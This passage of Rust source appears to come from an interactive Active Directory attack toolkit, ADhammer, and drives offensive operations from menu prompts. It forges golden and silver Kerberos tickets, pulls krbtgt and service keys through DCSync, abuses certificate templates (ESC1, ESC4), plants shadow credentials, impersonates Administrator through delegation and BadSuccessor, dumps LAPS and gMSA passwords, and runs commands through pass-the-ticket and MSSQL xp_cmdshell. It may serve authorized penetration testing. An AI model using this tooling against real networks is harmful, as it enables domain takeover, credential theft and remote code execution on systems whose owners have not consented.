                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::Gmsa => {
            let target: String = Input::new()
                .with_prompt("gMSA sAMAccountName (e.g. gmsa_web$)")
                .interact_text()?;
            gmsa(GmsaArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::Laps => {
            let t: String = Input::new()
                .with_prompt("Computer sAMAccountName (blank = dump all readable)")
                .allow_empty(true)
                .interact_text()?;
            let target = (!t.trim().is_empty()).then(|| t.trim().to_string());
            laps(LapsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::Esc1 => {
            let ca: String = Input::new()
                .with_prompt("CA name (e.g. corp-CA)")
                .interact_text()?;
            let template: String = Input::new()
                .with_prompt("Template")
                .with_initial_text("User")
                .interact_text()?;
            let upn: String = Input::new()
                .with_prompt("UPN to impersonate via SAN")
                .with_initial_text(format!("Administrator@{}", s.domain))
                .interact_text()?;
            let pkinit = prompt_confirm("Chain enroll → cert → PKINIT (TGT)?", false)?;
            esc1(Esc1Args {
                auth: crate::shared_args::SmbAuth {
                    host: s.dc.clone(),
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                ca,
                template,
                upn,
                out: std::env::temp_dir()
                    .join("adh_esc1.crt")
                    .to_string_lossy()
                    .into_owned(),
                pkinit,
                kdc: Some(s.dc.clone()),
            })
            .await
        }
        Action::Asktgt => {
            let out: String = Input::new()
                .with_prompt("ccache output path")
                .with_initial_text(format!("{}.ccache", s.username))
                .interact_text()?;
            // Password auth → AES256; hash-only session → overpass-the-hash (RC4).
            let (password, nt_hash) = if s.password.expose().is_empty() {
                (None, sess_hash(s))
            } else {
                (Some(s.password.expose().clone()), None)
            };
            asktgt(AsktgtArgs {
                user: s.username.clone(),
                realm: s.realm(),
                kdc: s.dc.clone(),
                password,
                nt_hash,
                out: Some(out),
            })
            .await
        }
        Action::Golden => {
            let (krbtgt_aes256, domain_sid) =
                fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
            let (user, rid) = prompt_impersonation()?;
            let verify_spn: String = Input::new()
                .with_prompt("Verify against SPN (empty = skip KDC check)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .allow_empty(true)
                .interact_text()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            golden(GoldenArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                krbtgt_aes256,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
                verify_spn: (!verify_spn.is_empty()).then_some(verify_spn),
                foreign_sid: Vec::new(),
            })
            .await
        }
        Action::Silver => {
            let account: String = Input::new()
                .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                .interact_text()?;
            let (service_aes256, domain_sid) =
                fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
            let spn: String = Input::new()
                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let (user, rid) = prompt_impersonation()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            silver(SilverArgs {
                realm: s.realm(),
                service_aes256,
                spn,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
            })
            .await
        }
        Action::Pth => {
            let golden_mode = prompt_select(
                "Ticket type",
                &[
                    "Golden (krbtgt key, via KDC)",
                    "Silver (service key, no KDC)",
                ],
                0,
            )? == 0;
            let (krbtgt_aes256, service_aes256, domain_sid) = if golden_mode {
                let (k, sid) = fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
                (Some(k), None, sid)
            } else {
                let account: String = Input::new()
                    .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                    .interact_text()?;
                let (k, sid) =
                    fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
                (None, Some(k), sid)
            };
            let (user, rid) = prompt_impersonation()?;
            let spn: String = Input::new()
                .with_prompt("Target SPN")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let command: String = Input::new()
                .with_prompt("Command to run (empty = just prove access)")
                .with_initial_text("whoami")
                .allow_empty(true)
                .interact_text()?;
            pth(PthArgs {
                host: s.dc.clone(),
                kdc: Some(s.dc.clone()),
                realm: s.realm(),
                domain_sid,
                krbtgt_aes256,
                service_aes256,
                spn: Some(spn),
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                command: (!command.is_empty()).then_some(command),
            })
            .await
        }
        Action::EnumSessions => {
            let host: String = Input::new()
                .with_prompt("Host to enumerate sessions on")
                .with_initial_text(&s.dc)
                .interact_text()?;
            sessions(SessionsArgs {
                auth: crate::shared_args::SmbAuth {
                    host,
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                nt_hash: s.nt_hash.as_ref().map(|h| h.expose().clone()),
                include_machine: false,
            })
            .await
        }
        Action::Unconstrained => unconstrained(s.scan_args()).await,
        Action::Dcshadow => {
            // Interactive menu currently only exposes the detector — not prep/cleanup, which
            // require an extra --dc-name arg the setup wizard doesn't collect.
            dcshadow(crate::DcshadowArgs {
                scan: s.scan_args(),
                prep: None,
                cleanup: None,
                site: "Default-First-Site-Name".to_string(),
                drsuapi: false,
                push: false,
                drs_host: None,
                drs_domain: None,
                target: None,
                attr: None,
                value: None,
                value_hex: None,
                rogue_dsa: None,
            })
            .await
        }
        Action::Shadowcred => {
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName (plant KeyCredentialLink)")
                .interact_text()?;
            let pkinit = prompt_confirm("Also do PKINIT to get a TGT as the target?", true)?;
            shadowcred(ShadowcredArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: true,
                target,
                pkinit,
                kdc: if pkinit { Some(s.dc.clone()) } else { None },
                realm: if pkinit { Some(s.realm()) } else { None },
                list: false,
                remove: None,
                clear: false,
                yes: false,
                pfx_password: "adhammer".into(),
                dry_run: false,
            })
            .await
        }
        Action::Esc4 => {
            let template: String = Input::new()
                .with_prompt("Certificate template to weaponize (cn, e.g. User)")
                .with_initial_text("User")
                .interact_text()?;
            esc4(Esc4Args {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: true,
                template,
                enrollee: None,
            })
            .await
        }
        Action::Badsuccessor => {
            let target: String = Input::new()
                .with_prompt("Victim sAMAccountName to succeed (usually a Domain Admin)")
                .interact_text()?;
            let dmsa_name: String = Input::new()
                .with_prompt("New dMSA name (no `$` suffix — appended automatically)")
                .interact_text()?;
            let container: String = Input::new()
                .with_prompt("Container DN (blank = default CN=Managed Service Accounts)")
                .allow_empty(true)
                .interact_text()?;
            badsuccessor(BadsuccessorArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.expose().clone(),
                insecure: true,
                container: if container.is_empty() {
                    None
                } else {
                    Some(container)
                },
                dmsa_name,
                target,
            })
            .await
        }
        Action::Constrained => {
            // Same S4U2Self+S4U2Proxy code path as RBCD; the difference is only intent.
            eprintln!("[*] Constrained delegation shares the RBCD chain — same prompts below.");
            let account: String = Input::new()
                .with_prompt("Controlled account (has msDS-AllowedToDelegateTo)")
                .interact_text()?;
            // WS-1.4.7-P1-A: password for the controlled account is a password-equivalent
            // secret — MUST be hidden. Prior `Input::new().interact_text()` echoed it.
            let account_password: String = prompt_password(&format!("Password for {account}"))?;
            let impersonate: String = Input::new()
                .with_prompt("Identity to impersonate (e.g. Administrator)")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::Mssql => {
            let host: String = Input::new()
                .with_prompt("MSSQL host/IP")
                .with_initial_text(&s.dc)
                .interact_text()?;
            let port: u16 = Input::new()
                .with_prompt("MSSQL port (SQL Browser resolution not implemented)")
                .with_initial_text("1433")
                .interact_text()?;
            let database: String = Input::new()
                .with_prompt("Initial database (blank = login default)")
                .allow_empty(true)
                .interact_text()?;
            let execute_as_raw: String = Input::new()
                .with_prompt("EXECUTE AS chain (comma-separated LOGINs, blank = none). Example: sa")
                .allow_empty(true)
                .interact_text()?;
            eprintln!(
                "[*] Common one-shots:\n\
                 [*]   EXEC xp_cmdshell 'whoami'                — RCE as service account\n\
                 [*]   SELECT SUSER_NAME(), SYSTEM_USER, HOST_NAME()  — identity + host\n\
                 [*]   SELECT name FROM master..sysdatabases    — list databases"
            );
            let query: String = Input::new()
                .with_prompt("SQL query (single statement)")
                .with_initial_text("EXEC xp_cmdshell 'whoami'")
                .interact_text()?;
            let execute_as: Vec<String> = execute_as_raw
                .split(',')
                .map(|t| t.trim().to_string())
                .filter(|t| !t.is_empty())
                .collect();
            mssql(MssqlArgs {
                auth: crate::shared_args::SmbAuth {
                    host,
                    domain: s.netbios(),
                    user: s.username.clone(),
                    password: s.password.expose().clone(),
                },
                query,
                port,
                database: (!database.trim().is_empty()).then(|| database.trim().to_string()),
                tsv: false,
                execute_as,
            })
            .await
        }
        Action::ShowRoadmap | Action::WipeSession | Action::Exit => Ok(()),
    }
}

/// Auto-fetch `account`'s AES256 key (via DCSync) and the domain SID (via LSAT) using the
/// session's admin credentials — so golden/silver/pth need no manual paste. Falls back to manual
/// prompts if declined or if the account has no AES256 key.
async fn fetch_key_and_sid(
    s: &Session,
    account: &str,
    key_label: &str,
) -> Result<(String, String)> {
    // A hash-only session can't DCSync/LSAT-bind here, so go straight to manual entry.
    let auto = if s.password.expose().is_empty() {
        false
    } else {
        prompt_confirm(
            &format!(
                "Auto-fetch {account}'s AES256 key + domain SID via DCSync (uses your session creds)?"
            ),
            true,
        )
        .unwrap_or(false)
    };
    if !auto {
        return Ok((prompt_key(key_label)?, prompt_sid()?));
    }

    // Key via DCSync (DRSUAPI over sealed RPC).
    let mut drs =
        ms_drsr::DrsSession::bind(&s.dc, &s.netbios(), &s.username, s.password.expose()).await?;
    let (_rid, _nt, kerb) = drs.dcsync(&s.netbios(), account).await?;
    let key = kerb
        .iter()
        .find(|k| k.etype_name() == "aes256-cts-hmac-sha1-96")
        .map(|k| hex::encode(&k.key))
        .context("account has no AES256 key in supplementalCredentials")?;

    // Domain SID via LSAT (resolve the account, drop the RID).
    let sid = lookup_domain_sid(s, account).await?;
    println!("[*] fetched {account} AES256 key + domain SID {sid}");
    Ok((key, sid))
}

/// Resolve `account` to a SID over LSAT and strip the RID to yield the domain SID string.
async fn lookup_domain_sid(s: &Session, account: &str) -> Result<String> {
    let mut smb = smb2_client::SmbClient::connect(&s.dc).await?;
    smb.login(&s.dc, &s.netbios(), &s.username, s.password.expose())
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", s.dc)).await?;
    let pipe = smb.open_pipe("lsarpc").await?;
    let mut c = dcerpc::lsat::LsatClient::bind(&mut smb, pipe).await?;
    let policy = c.open_policy().await?;
    let sid = c
        .lookup_name(&policy, account)
        .await?
        .context("LSAT could not resolve the account to a SID")?;
    let mut subs = sid.sub_authorities.clone();
    subs.pop(); // drop the RID → domain SID
    let domain = windows_sddl::Sid {
        revision: sid.revision,
        identifier_authority: sid.identifier_authority,
        sub_authorities: subs,
    };
    Ok(domain.to_string())
}

/// Prompt for a 64-hex AES256 key, trimming/validating length + hex alphabet.
///
/// WS-1.4.7-P1-A: AES256 keys are password-equivalent secrets — MUST be hidden.
/// WS-1.4.7-P2-A: also enforce hex alphabet (64 chars of `Z` used to pass the
/// length-only check and produce a cryptic downstream error rather than fail at the prompt).
fn prompt_key(label: &str) -> Result<String> {
    let k = prompt_password(label)?;
    let k = k.trim().to_string();
    anyhow::ensure!(
        k.len() == 64,
        "expected a 64-hex AES256 key, got {} chars",
        k.len()
    );
    anyhow::ensure!(
        k.chars().all(|c| c.is_ascii_hexdigit()),
        "AES256 key must contain only hex characters [0-9a-fA-F]"
    );
    Ok(k)
}

fn prompt_select<T: AsRef<str>>(prompt: &str, items: &[T], default: usize) -> Result<usize> {
    anyhow::ensure!(!items.is_empty(), "{prompt}: no choices available");
    anyhow::ensure!(
        default < items.len(),
        "{prompt}: default index {default} is out of range for {} choices",
        items.len()
    );

    eprintln!();
    eprintln!("{prompt}");
    crate::ui::menu_legend();
    for (idx, item) in items.iter().enumerate() {
        let marker = if idx == default { "*" } else { " " };
        eprintln!("  {marker} {}. {}", idx + 1, item.as_ref());
    }

    loop {
        let raw: String = Input::new()
            .with_prompt(format!(
                "{prompt} [1-{}, Enter={} ]",
                items.len(),
                default + 1
            ))
            .allow_empty(true)
            .interact_text()?;
        let raw = raw.trim();
        if raw.is_empty() {
            return Ok(default);
        }
        if let Some(choice) = parse_menu_choice(raw, items.len()) {
            return Ok(choice);
        }
        crate::ui::bad(&format!("Enter a number between 1 and {}.", items.len()));
    }
}

async fn run_action_with_brief(action: &Action, s: &Session) -> Result<()> {
    // Per-action stage checklist. Mirrors auto-mode's `scan`/`guided` checklists so
    // interactive users get the same "which stage stopped the pipeline" story.
    // Three generic stages fit every action shape: preflight-brief → execute → post-run.
    // Actions that internally have richer stages (spray = target + auth + attempt +
    // detect-lockout, dcsync = bind + drs + save) can be enriched later by threading
    // `&mut StageChecklist` down; the outer 3-stage wrap gives every action at least
    // the run-level visibility for free.
    let mut checklist =
        crate::ui::StageChecklist::new(["preflight brief", "execute action", "post-run outcome"]);
    show_action_brief(action, s);
    checklist.record_ok("preflight brief", "action + mode announced");
    crate::ui::hold();
    let start = Instant::now();
    let card_title = format!("{} stages", action_name(action));
    let card_title_failed = format!("{} stages (failed)", action_name(action));
    match dispatch(action, s).await {
        Ok(()) => {
            let elapsed = start.elapsed().as_secs_f32();
            checklist.record_ok("execute action", format!("{elapsed:.1}s"));
            crate::ui::outcome(
                crate::ui::OutcomeKind::Validated,
                &format!("{} completed ({elapsed:.1}s)", action_name(action)),
            );
            if let Some(next) = action_next_hint(action) {
                crate::ui::field_err("next", next);
            }
            checklist.record_ok("post-run outcome", "validated");
            checklist.render(&card_title);
            pause_after_action()?;
            Ok(())
        }
        Err(e) => {
            let elapsed = start.elapsed().as_secs_f32();
            let reason = format!("{e:#}");
            let brief = reason
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            crate::ui::outcome(
                crate::ui::OutcomeKind::Failed,
                &format!("{} failed ({elapsed:.1}s)", action_name(action)),
            );
            crate::ui::field_err("reason", &reason);
            if let Some(diag) = diagnose_connection_error(&reason) {
                crate::ui::field_err("cause", diag);
            }
            if let Some(next) = action_failure_hint(action) {
                crate::ui::field_err("next", next);
            }
            checklist.render(&card_title_failed);
            pause_after_action()?;
            Err(e)
        }
    }
}

fn show_action_brief(action: &Action, s: &Session) {
    crate::ui::header_err("Preflight");
    crate::ui::field_story_err("action", action_name(action), crate::ui::Pace::Fast);
    crate::ui::field_story_err(
        &crate::ui::sticker("MODE", crate::ui::Tone::Accent),
        action_mode(action),
        crate::ui::Pace::Fast,
    );
    crate::ui::field_story_err("host", &s.dc, crate::ui::Pace::Fast);
    crate::ui::field_story_err("user", &s.username, crate::ui::Pace::Fast);
    crate::ui::field_story_err(
        &crate::ui::sticker("PROOF", crate::ui::Tone::Good),
        action_proof_hint(action),
        crate::ui::Pace::Normal,
    );
    crate::ui::field_story_err(
        &crate::ui::sticker("WRITES", crate::ui::Tone::Warn),
        action_write_hint(action),
        crate::ui::Pace::Normal,
    );
    if let Some(note) = action_note(action) {
        crate::ui::field_story_err(
            &crate::ui::sticker("NOTE", crate::ui::Tone::Dim),
            note,
            crate::ui::Pace::Important,
        );
    }
}

fn action_name(action: &Action) -> &'static str {
    match action {
        Action::Scan => "Scan",
        Action::Guided => "Auto / Guided",
        Action::Roast => "Roast",
        Action::Spray => "Spray",
        Action::EnumSamr => "Enum SAMR",
        Action::EnumLsa => "Enum LSA",
        Action::NetSweep => "Net sweep",
        Action::DnsEnum => "DNS enumeration",
        Action::AdcsEnum => "AD CS enumeration",
        Action::EnumEsc => "ESC registry enumeration",
        Action::EnumPosture => "Posture enumeration",
        Action::Abuse => "LDAP abuse",
        Action::Coerce => "Coerce",
        Action::Zerologon => "Zerologon detection",
        Action::Rbcd => "RBCD",
        Action::Dcsync => "DCSync",
        Action::Capture => "NTLM capture",
        Action::Poison => "LLMNR / NBT-NS poison",
        Action::Relay => "NTLM relay",
        Action::Exec => "Exec",
        Action::Wmiexec => "WMIexec",
        Action::Winrm => "WinRM",
        Action::Secretsdump => "Secretsdump",
        Action::Gmsa => "gMSA",
        Action::Laps => "LAPS",
        Action::Esc1 => "ESC1",
        Action::Asktgt => "AskTGT",
        Action::Golden => "Golden ticket",
        Action::Silver => "Silver ticket",
        Action::Pth => "Pass-the-ticket",
        Action::EnumSessions => "Session enumeration",
        Action::Unconstrained => "Unconstrained delegation",
        Action::Shadowcred => "Shadow credentials",
        Action::Esc4 => "ESC4",
        Action::Badsuccessor => "BadSuccessor",
        Action::Dcshadow => "DCShadow detector",
        Action::Constrained => "Constrained delegation",
        Action::Mssql => "MSSQL",
        Action::AttackDns => "ADIDNS write",
        Action::EnumSccm => "SCCM enumeration",
        Action::EnumScom => "SCOM enumeration",
        Action::ShowRoadmap => "Roadmap",
        Action::WipeSession => "Wipe session",
        Action::Exit => "Exit",
    }
}

fn action_mode(action: &Action) -> &'static str {
    match action {
        Action::Scan
        | Action::Guided
        | Action::EnumSamr
        | Action::EnumLsa
        | Action::NetSweep
        | Action::DnsEnum
        | Action::AdcsEnum
        | Action::EnumEsc
        | Action::EnumPosture
        | Action::EnumSessions
        | Action::EnumSccm
        | Action::EnumScom
        | Action::Unconstrained
        | Action::Dcshadow
        | Action::Zerologon => "passive / low-impact",
        Action::Roast | Action::Spray | Action::Gmsa | Action::Laps | Action::Asktgt => {
            "credential / validation"
        }
        Action::Capture
        | Action::Poison
        | Action::Relay
        | Action::Exec
        | Action::Wmiexec
        | Action::Winrm
        | Action::Secretsdump
        | Action::Rbcd
        | Action::Constrained
        | Action::Esc1
        | Action::Esc4
        | Action::Golden
        | Action::Silver
        | Action::Pth
        | Action::Mssql
        | Action::Abuse
        | Action::Coerce
        | Action::Dcsync
        | Action::Shadowcred
        | Action::Badsuccessor
        | Action::AttackDns => "active / impacting",
        Action::ShowRoadmap | Action::WipeSession | Action::Exit => "session",
    }
}

fn action_proof_hint(action: &Action) -> &'static str {
    match action {
        Action::Guided => "multi-step findings, proof snippets, optional export bundle",
        Action::Scan => "findings and control paths",
        Action::Roast => "Kerberos hash material",
        Action::Spray => "valid / invalid login outcomes",
        Action::Gmsa => "managed password hash",
        Action::Laps => "local admin password",
        Action::Asktgt | Action::Golden | Action::Silver | Action::Pth => "ticket / ccache output",
        Action::Exec | Action::Wmiexec | Action::Winrm | Action::Mssql => "command output",
        Action::Relay | Action::Esc1 | Action::Esc4 | Action::Shadowcred => {
            "LDAP or certificate proof"
        }
        Action::Dcsync | Action::Secretsdump => "replicated or dumped secret material",
        _ => "stdout / stderr proof in the run output",
    }
}

fn action_write_hint(action: &Action) -> &'static str {
    match action {
        Action::Guided => "writes reports if you export them",
        Action::Asktgt | Action::Golden | Action::Silver | Action::Esc1 => {
            "may write ccache or certificate artifacts"
        }
        Action::Capture
        | Action::Poison
        | Action::Relay
        | Action::Exec
        | Action::Wmiexec
        | Action::Winrm
        | Action::Mssql
        | Action::Abuse
        | Action::Coerce
        | Action::Rbcd
        | Action::Constrained
        | Action::Dcsync
        | Action::Secretsdump
        | Action::Shadowcred
        | Action::Esc4
        | Action::Badsuccessor => "network-side effects likely",
        _ => "no local artifacts unless the action says otherwise",
    }
}

fn action_note(action: &Action) -> Option<&'static str> {
    match action {
        Action::Guided => {
            Some("After the scan, ADhammer will ask what to validate and whether to export proof.")
        }
        Action::Constrained => {
            Some("Uses the same S4U chain as RBCD, but framed for AllowedToDelegateTo abuse.")
        }
        Action::Zerologon => {
            Some("Interactive mode only exposes the safe detector, not the destructive reset path.")
        }
        _ => None,
    }
}

fn action_next_hint(action: &Action) -> Option<&'static str> {
    match action {
        Action::Guided => Some("Open the exported summary or HTML if you chose export; otherwise review the validated findings above."),
        Action::Scan => Some("If findings were interesting, rerun Auto / Guided to validate the strongest paths."),
        _ => Some("Proof is in the command output above. Guided mode is the best path when you need packaged artifacts."),
    }
}

/// Map a raw connection-failure string to a concrete "what actually went wrong" line, so the
/// generic `next:` hint doesn't hide the actual cause. Runs against the already-formatted
/// `anyhow` chain, so it catches both the ldap3/rustls surface text and the inner io::Error kind.
pub(crate) fn diagnose_connection_error(reason: &str) -> Option<&'static str> {
    let r = reason.to_ascii_lowercase();
    // The classic Kali-vs-lab-DC case: LDAPS handshake fails cert verification, DC resets.
    // "Connection reset by peer" over an ldaps:// URL is almost always this.
    if (r.contains("connection reset") || r.contains("os error 104"))
        && (r.contains("ldaps") || r.contains("tls") || r.contains("certificate"))
    {
        return Some(
            "TLS/cert verification likely failed — rerun and answer YES to \"Skip LDAPS certificate verification (lab DC)?\", or pass --insecure, or use ldap:// on 389",
        );
    }
    // Bare "connection reset" without a TLS marker: still most often a channel-binding / signing
    // mismatch on LDAPS, or the DC refused the SASL/bind mid-negotiation.
    if r.contains("connection reset") || r.contains("os error 104") {
        return Some(
            "DC reset the connection mid-bind — usually LDAP-signing/channel-binding enforcement or an untrusted TLS cert; try plain ldap://<host> or add --insecure",
        );
    }
    // Cert-name / chain issues surface differently depending on the TLS backend.
    if r.contains("certificate")
        || r.contains("unknown ca")
        || r.contains("self-signed")
        || r.contains("certificateunknown")
        || r.contains("bad certificate")
    {
        return Some(
            "LDAPS certificate not trusted by this host — answer YES to skip cert verification on a lab DC, or install the DC's CA chain",
        );
    }
    if r.contains("kerberos") || r.contains("krb") || r.contains("gssapi") || r.contains("preauth")
    {
        return Some(
            "Kerberos negotiation failed — check clock skew (<5 min), realm case (UPPERCASE), and SPN/DNS resolution for the DC",
        );
    }
    if r.contains("invalidcredentials") || r.contains("52e") || r.contains("logon failure") {
        return Some(
            "Bind rejected — bad username/password/domain (LDAP result 49 / SEC_E_LOGON_DENIED 0x8009030c)",
        );
    }
    if r.contains("connection refused") || r.contains("os error 111") {
        return Some(
            "Port closed / service not listening — nmap the DC to confirm 389/636/445 are actually open",
        );
    }
    if r.contains("timed out") || r.contains("timeout") {
        return Some(
            "Timeout — firewall dropping packets, or the DC is behind a slow path; retry with --insecure and plain ldap:// to isolate",
        );
    }
    // Bind mid-negotiation drop (EOF/broken pipe): the DC read our BIND then closed
    // rather than replying — typically an unsupported SASL mechanism or a hardened LDAPS
    // that refused the auth level (signing/CBT) without an explicit LDAP-level fault code.
    if r.contains("broken pipe")
        || r.contains("unexpected eof")
        || r.contains("os error 32")
        || r.contains("os error 10054")
    {
        return Some(
            "Server closed the connection mid-handshake — usually unsupported SASL mechanism or LDAP-signing/CBT rejection. Try `--gssapi` for Kerberos signing, or plain `ldap://` on 389 to isolate whether the TLS layer is the problem.",
        );
    }
    // DNS resolution failure — often "no such host" / getaddrinfo errors surfaced by tokio.
    if r.contains("no such host")
        || r.contains("failed to lookup address")
        || r.contains("nodename nor servname")
        || r.contains("os error 11001")
    {
        return Some(
            "Hostname didn't resolve — check your DNS points at the DC (or add it to /etc/hosts). Try `dig +short <host>` / `nslookup <host>`.",
        );
    }
    // Fallback: raw I/O errors that didn't match a more specific branch.
    if r.contains("i/o error") || r.contains("io error") {
        return Some(
            "Low-level I/O error at the socket layer — verify TCP reachability first (`nc -vz <host> <port>`), then retry with `--insecure` if the port is open but TLS is refusing.",
        );
    }
    None
}

fn action_failure_hint(action: &Action) -> Option<&'static str> {
    match action {
        Action::Guided | Action::Scan => Some("Re-check bind identity, DC reachability, and LDAPS settings."),
        Action::Exec | Action::Wmiexec | Action::Winrm | Action::Mssql => {
            Some("Re-check host reachability, service availability, and the privileges of the current identity.")
        }
        _ => Some("Re-check credentials, target context, and any required delegation or CA prerequisites."),
    }
}

fn pause_after_action() -> Result<()> {
    crate::ui::note("Press Enter to return to the menu.");
    let _: String = Input::new()
        .with_prompt("")
        .allow_empty(true)
        .interact_text()?;
    Ok(())
}

fn prompt_confirm(prompt: &str, default: bool) -> Result<bool> {
    crate::ui::note("Controls: Enter=default  y=yes  n=no  Ctrl+C=cancel");
    Confirm::new()
        .with_prompt(prompt)
        .default(default)
        .interact()
        .map_err(Into::into)
}

fn prompt_password(prompt: &str) -> Result<String> {
    match Password::new().with_prompt(prompt).interact() {
        Ok(value) => Ok(value),
        Err(err) => {
            crate::ui::warn(&format!(
                "hidden password input unavailable ({err}) — falling back to visible entry"
            ));
            Input::<String>::new()
                .with_prompt(format!("{prompt} (visible)"))
                .interact_text()
                .map_err(Into::into)
        }
    }
}

fn parse_menu_choice(raw: &str, len: usize) -> Option<usize> {
    let n = raw.parse::<usize>().ok()?;
    if (1..=len).contains(&n) {
        Some(n - 1)
    } else {
        None
    }
}

fn prompt_sid() -> Result<String> {
    Ok(Input::<String>::new()
        .with_prompt("Domain SID (S-1-5-21-a-b-c)")
        .interact_text()?
        .trim()
        .to_string())
}

/// Impersonation identity: user + RID (defaults to Administrator / 500).
fn prompt_impersonation() -> Result<(String, u32)> {
    let user: String = Input::new()
        .with_prompt("Impersonate user")
        .with_initial_text("Administrator")
        .interact_text()?;
    let rid: u32 = Input::new()
        .with_prompt("RID")
        .with_initial_text("500")
        .interact_text()?;
    Ok((user, rid))
}

fn print_roadmap_summary() {
    println!();
    println!("=== Open vectors (summary) ===");
    println!("  Audit:  badSuccessor OU-ACL depth, ESC15/EKUwu, ESC5/6/7/10");
    println!("  Attack: pass-the-ticket, pass-the-hash, constrained delegation");
    println!("          GMSA/LAPS read, cert enrollment (ESC1/3 exploit)");
    println!("          ESC8/11 relay, SVCCTL/TSCH remote exec");
    println!("          full-domain DCSync, orchestrated coerce→relay→pkinit");
    println!("  Stack:  LDAP channel binding, GSSAPI bind (feature flag)");
    println!("          SVCCTL · TSCH · RRPM · NETLOGON · WINRM clients");
    println!();
    println!("  Full matrix: VECTORS.md in the repo root (or next to the binary source).");
    println!("  Suggested close order: PTT → ESC5/7 passive → constrained del → GMSA/LAPS → SVCCTL/TSCH → cert enroll");
}

#[cfg(test)]
mod tests {
    use super::parse_menu_choice;

    #[test]
    fn parse_menu_choice_accepts_valid_numbers() {
        assert_eq!(parse_menu_choice("1", 3), Some(0));
        assert_eq!(parse_menu_choice("3", 3), Some(2));
    }

    #[test]
    fn parse_menu_choice_rejects_invalid_numbers() {
        assert_eq!(parse_menu_choice("0", 3), None);
        assert_eq!(parse_menu_choice("4", 3), None);
        assert_eq!(parse_menu_choice("abc", 3), None);
    }
}
